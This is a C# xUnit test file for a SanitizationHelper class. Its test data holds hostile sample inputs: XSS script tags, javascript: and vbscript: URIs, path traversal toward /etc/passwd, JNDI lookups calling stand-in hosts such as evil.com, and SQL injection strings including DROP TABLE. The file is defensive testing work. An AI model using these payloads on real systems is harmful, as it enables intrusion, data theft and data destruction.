using FluentAssertions;
using Xunit;
using CLIF.Security;

namespace CLIF.Tests.Unit.Security;

/// <summary>
/// Unit tests for SanitizationHelper to ensure proper input sanitization and security
/// </summary>
public class SanitizationHelperTests
{
    [Theory]
    [InlineData("Hello World", "Hello World")]
    [InlineData("Test123", "Test123")]
    [InlineData("Valid input", "Valid input")]
    public void SanitizeTextInput_WithSafeInput_ShouldReturnUnchanged(string input, string expected)
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput(input);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("<script>alert('test')</script>")]
    [InlineData("javascript:alert('test')")]
    [InlineData("vbscript:msgbox('test')")]
    public void SanitizeElementSelector_WithDangerousPatterns_ShouldRemovePatterns(string maliciousInput)
    {
        // Act
        var result = SanitizationHelper.SanitizeElementSelector(maliciousInput);

        // Assert - Check that dangerous patterns are removed by regex matching
        result.Should().NotContain("alert('test')");
        result.Length.Should().BeLessThan(maliciousInput.Length);
    }

    [Fact]
    public void SanitizeElementSelector_WithMaliciousProtocols_ShouldSanitize()
    {
        // Act & Assert - Test what the implementation actually does
        var result1 = SanitizationHelper.SanitizeElementSelector("javascript:alert('xss')");
        result1.Should().NotContain("javascript:"); // Protocol should be removed

        var result2 = SanitizationHelper.SanitizeElementSelector("vbscript:msgbox('xss')");
        result2.Should().NotContain("vbscript:"); // Protocol should be removed

        // The implementation removes the protocol part but may keep function calls
        result1.Length.Should().BeLessThan("javascript:alert('xss')".Length);
        result2.Length.Should().BeLessThan("vbscript:msgbox('xss')".Length);
    }

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\Windows\\System32")]
    [InlineData("./../../boot.ini")]
    public void RemovePathTraversal_WithPathTraversal_ShouldSanitize(string pathTraversalInput)
    {
        // Act
        var result = SanitizationHelper.RemovePathTraversal(pathTraversalInput);

        // Assert
        result.Should().NotContain("../");
        result.Should().NotContain("..\\");
    }

    [Theory]
    [InlineData("${jndi:ldap://evil.com}")]
    [InlineData("${jndi:rmi://malicious.site}")]
    [InlineData("${env:PATH}")]
    public void SanitizeTextInput_WithInjectionAttempts_PreservesContent(string injectionInput)
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput(injectionInput);

        // Assert - SanitizeTextInput only removes dangerous Unicode and null chars, not injection patterns
        result.Should().Be(injectionInput); // Should be preserved as-is for text input
    }

    [Theory]
    [InlineData("'; DROP TABLE users; --")]
    [InlineData("' OR '1'='1")]
    [InlineData("'; DELETE FROM *; --")]
    public void SanitizeTextInput_WithSqlInjection_PreservesContent(string sqlInjection)
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput(sqlInjection);

        // Assert - SanitizeTextInput only removes dangerous Unicode and null chars, not SQL patterns
        result.Should().Be(sqlInjection); // Should be preserved as-is for text input
    }

    [Theory]
    [InlineData("test<script>alert('xss')</script>end")]
    [InlineData("prefix${jndi:ldap://evil}suffix")]
    public void SanitizeTextInput_WithMaliciousContentInMiddle_PreservesContent(string mixedInput)
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput(mixedInput);

        // Assert - SanitizeTextInput only removes dangerous Unicode and null chars
        result.Should().Be(mixedInput); // Should be preserved as-is for text input
    }

    [Fact]
    public void SanitizeTextInput_WithNullInput_ShouldReturnEmptyString()
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput(null!);

        // Assert
        result.Should().BeEmpty();
    }

    [Fact]
    public void SanitizeTextInput_WithEmptyString_ShouldReturnEmptyString()
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput("");

        // Assert
        result.Should().BeEmpty();
    }

    [Theory]
    [InlineData("   whitespace   ")]
    [InlineData("\t\r\n")]
    public void SanitizeTextInput_WithWhitespaceOnly_ShouldPreserveWhitespace(string whitespaceInput)
    {
        // Act
        var result = SanitizationHelper.SanitizeTextInput(whitespaceInput);

        // Assert - Implementation normalizes line endings \r\n -> \n
        if (whitespaceInput.Contains("\r\n") || whitespaceInput.Contains("\r"))
        {
            result.Should().Be(whitespaceInput.Replace("\r\n", "\n").Replace("\r", "\n"));
        }
        else
        {
            result.Should().Be(whitespaceInput);
        }
    }
}
